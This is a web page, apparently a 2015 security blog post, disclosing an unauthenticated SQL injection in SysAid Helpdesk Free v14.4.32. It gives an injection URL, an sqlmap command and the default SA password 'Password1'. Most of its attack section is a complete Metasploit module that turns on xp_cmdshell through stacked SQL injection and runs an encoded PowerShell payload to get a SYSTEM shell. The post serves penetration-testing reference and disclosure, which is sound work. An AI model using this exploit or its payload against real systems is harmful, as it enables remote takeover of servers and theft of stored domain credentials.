@@ -1,0 +1,178 @@
+<!DOCTYPE HTML><html><head><title>Hackallthethings.xyz</title><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" /><link rel="stylesheet" href="/assets/css/main.css" /><link href="/assets/css/syntax.css" rel="stylesheet" /></head><body class="is-preload"><div id="header"><div class="top"><div id="logo"> <span class="image avatar48"><img src="/assets/images/avatar.jpg" alt="" /></span><h1 id="title">Hland</h1><p></p></div><nav id="nav"><ul><li><a href="/" id="top-link"><span class="icon fa-user">whoami</span></a></li><li><a href="/library"><span class="icon fa-book">Library</span></a></li><li><a href="/weblog"><span class="icon fa-rss">Weblog</span></a></li></ul></nav></div><div class="bottom"><ul class="icons"><li><a href="https://twitter.com/vladthegad" target="_blank" _rel="noreferrer noopen" class="icon fa-twitter"><span class="label">Twitter</span></a></li><li><a href="https://lmgtfy.com/?q=Privacy+is+not+dead" target="_blank" _rel="noreferrer noopen" class="icon fa-facebook"><span class="label">Facebook</span></a></li><li><a href="https://hackerone.com/hland" target="_blank" _rel="noreferrer noopen" class="icon"><span class="label">HackerOne</span></a></li></ul></div></div><section id="weblog" class="two"><div class="container"><header><h2>Unauthenticated SQL Injection in Sysaid Helpdesk Free v.14.4.32. b25</h2><p>Writtten by Hland on 29th September 2015</p></header><section class="post"><p>Discovered: June 2015</p><p>This is a flaw that I came across at a pentest for a client, the flaw ended up giving us enterprise admin access which isn’t too bad.</p><p>This issue is fixed in later versions and it seems that Sysaid have become aware of the issue on their own. This writeup is mostly for my own reference and everybody out there doing penetration testing encountering old versions of the software inside company networks.</p><h2 id="the-product">The product</h2><p><a href="https://www.sysaid.com/">https://www.sysaid.com/</a></p><p>This is helpdesk software made ofr for managing company support cases, providing remote support, and a bunch of other stuff. This software’s database can contain domain credentials that are encrypted using a hardcoded secret as mentioned in the referenced CVEs. This makes it a high-value target that can give access to a large number of credentials and highly privileged accounts. The vulnerability will give facilitate remote code execution on the server as the SYSTEM user if the default configuration is in use.</p><h2 id="the-vulnerability">The vulnerability</h2><p>Sysaid is vulnerable to SQL injection at the following url:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://sysaidserver:8080/api/v1/menu/menu_items?menu=main'WAITFOR+DELAY'0%3a0%3a10'--&amp;all_tree=true
+</code></pre></div></div><p>This makes it possible to dump the entire database using for instance SQLMap. To exploit the vulnerability successfully, SQLMap must be provided with a valid JSESSIONID cookie that will be set by the server upon first visit to the site.</p><p>The following SQLMap command will detect and be able to exploit the injection vulnerability to return the user that the database commands are executed as:</p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -u http://sysaidserver:8080/api/v1/menu/menu_items?menu=main*&amp;all_tree=true --cookie="JSESSIONID=xxx" --current-user 
+</code></pre></div></div><p>The database is by default running as SA and can therefore activate <code class="highlighter-rouge">xp_cmdshell</code> to run operating system commands with the privileges of the user the database is running as. By default this user is the SYSTEM user on Windows.</p><p>Also the default “SA” user’s password is “Password1” which can be found in cleartext in the configuration files (CVE-2015-3001)</p><iframe width="420" height="315" src="https://www.youtube.com/embed/hbxL0UvYrdE" frameborder="0" allowfullscreen=""></iframe><h2 id="previous-vulnerabilities-in-sysaid-software">Previous Vulnerabilities in Sysaid Software</h2><ul><li>SysAid Server Arbitrary File Disclosure (2014-12-23)</li><li>Ilient SysAid 8.5.5 Multiple Cross Site Scripting and HTML Injection Vulnerabilities (2012-03-08)</li><li>Authenticated Blind SQL injection (2012-11-30)</li><li>CVE-2015-2993, CVE-2015-2994, CVE-2015-2995, CVE-2015-2996, CVE-2015-2997, CVE-2015-2998,CVE-2015-2999,CVE-2015-3000,CVE-2015-3001, CVE-2014-9436, CVE-2008-2179, CVE-2007-5259</li></ul><h2 id="metasploit-module">Metasploit module</h2><p>I wrote my first “real” Metasploit module to have a simple way to exploit this. As I have little to no experience with writing Metasploit modules and I’m not fluent in Ruby, it is a bit of a hack. But it should work and I hope someone can make use of it, I know I will the next time I encounter one of these installations..</p><p><a href="https://bitbucket.org/hland/metasploitmodules/raw/fcabc17fb0bd00bf3a095f68fe8e1457b8407103/sysaid_sqli.rb">Exploit</a></p><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'msf/core/exploit/powershell'
+require 'msf/core/exploit/mssql_commands'
+
+
+class Metasploit3 &lt; Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::Remote::HttpClient
+
+
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           =&gt; "Sysaid Helpdesk Software Unauthenticated SQLi",
+      'Description'    =&gt; %q{
+        This module exploits an unauthenticated SQLi vulnerability in the Sysaid 
+        Helpdesk Free software. Because the "menu" parameter is not handled correctly,
+        a malicious user can manipulate the SQL query, and allows
+        arbitrary code execution under the context of 'SYSTEM' because the database
+        runs as the SA user. This module uses a Metasploit generated Powershell payload and 
+	uses xp_cmdshell, which is activated and then deactivated after exploitation.
+      },
+      'License'        =&gt; MSF_LICENSE,
+      'Author'         =&gt;
+        [
+          'Hland', 
+        ],
+      'References'     =&gt;
+        [
+          ['CVE', 'xxxx'],
+        ],
+      'Payload'        =&gt;
+        {
+          'BadChars' =&gt; "\x00"
+        },
+      'DefaultOptions'  =&gt;
+        {
+          'InitialAutoRunScript' =&gt; 'migrate -f'
+        },
+      'Platform'       =&gt; 'win',
+      'Targets'        =&gt;
+        [
+          ['Sysaid Helpdesk &lt;= v14.4.32 b25', {}]
+        ],
+      'Privileged'     =&gt; false,
+      'DisclosureDate' =&gt; "Aug 29 2015",
+      'DefaultTarget'  =&gt; 0,
+
+))
+
+      register_options(
+        [
+          OptPort.new('RPORT',     [true, "The web application's port", 8080]),
+          OptString.new('TARGETURI', [true, 'The base path to to the web application', '/'])
+        ], self.class)
+  end
+
+  def check
+
+    peer = "#{rhost}:#{rport}"
+    uri = target_uri.path
+    uri = normalize_uri(uri,"Login.jsp")
+
+    print_status("#{peer} - Checking for vulnerability")
+
+    res = send_request_cgi({
+      'method'    =&gt; 'GET',
+      'uri'       =&gt; uri,
+      'vars_get' =&gt; {
+      }
+    })
+
+    v = res.body.scan(/\&lt;title\&gt;SysAid Help Desk Software\&lt;\/title\&gt;/)
+    if not v
+        vprint_error("Is this even a Sysaid Help Desk?")
+        return Exploit::CheckCode::Safe
+    else
+        vprint_status("Identified system as Sysaid Help Desk")
+	return Exploit::CheckCode::Appears
+
+    end
+
+    return Exploit::CheckCode::Unknown
+
+  end
+
+  def mssql_xpcmdshell(cmd,doprint=false,opts={})
+    force_enable = false
+    begin
+      res = mssql_query("EXEC master..xp_cmdshell '#{cmd}'", doprint)
+      #mssql_print_reply(res) if doprint
+
+      return res
+
+    rescue RuntimeError =&gt; e
+      if(e.to_s =~ /xp_cmdshell disabled/)
+        force_enable = true
+        retry
+      end
+      raise e
+    end
+  end
+
+  def exploit
+    peer = "#{rhost}:#{rport}"
+    uri = target_uri.path
+
+    vprint_line("#{peer} - Getting a session token...")
+    
+    res = send_request_cgi({
+      'method'    =&gt; 'GET',
+      'uri'       =&gt; normalize_uri(uri, "Login.jsp"),
+      'vars_get' =&gt; {
+      }
+    })
+
+    vprint_line("#{peer} - Cookie's in the jar...")
+
+    # Got a cookie, now ready to make exploiting requests
+    if res &amp;&amp; res.code == 200
+        #vprint_line("#{res.headers}")
+        cookies = res.get_cookies
+        #vprint_line("#{cmd_psh_payload(payload.encoded, payload_instance.arch.first)}")
+    else
+        vprint_line("No 200 response? I'm outta here")
+        return
+
+    end
+
+    # Put together the vulnerable URI
+    uri = normalize_uri(uri,"api","v1","menu","menu_items")
+
+    # Generate powershell payload as an encoded string
+    powershell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {:encode_final_payload =&gt; true, :remove_comspec =&gt; true})
+
+    
+
+    #
+    # Inject payload and wait for shell
+    #
+    print_status("#{peer} - Trying to activate xp_cmdshell and exploit vulnerability")
+
+    sqli = "main';exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;EXEC master..xp_cmdshell '#{powershell_payload}';--"
+    res = send_request_cgi({
+      'method'    =&gt; 'GET',
+      'uri'       =&gt; uri,
+      'cookie'    =&gt; cookies,
+      'vars_get' =&gt; {
+        'menu' =&gt; sqli,
+      }
+    })
+
+
+    # Deactivate XPCmdShell
+    sqli = "main';exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure 'show advanced options', 0 ;RECONFIGURE;--"
+    print_status("#{peer} - Deactivating xp_cmdshell to clean up after ourselves..")
+
+    res = send_request_cgi({
+      'method'    =&gt; 'GET',
+      'uri'       =&gt; uri,
+      'cookie'    =&gt; cookies,
+      'vars_get' =&gt; {
+        'menu' =&gt; sqli,
+      }
+    })
+
+  end
+end
+</code></pre></div></div></section></div></section><script src="/assets/js/jquery.min.js"></script> <script src="/assets/js/jquery.scrolly.min.js"></script> <script src="/assets/js/jquery.scrollex.min.js"></script> <script src="/assets/js/browser.min.js"></script> <script src="/assets/js/breakpoints.min.js"></script> <script src="/assets/js/util.js"></script> <script src="/assets/js/main.js"></script></body></html>
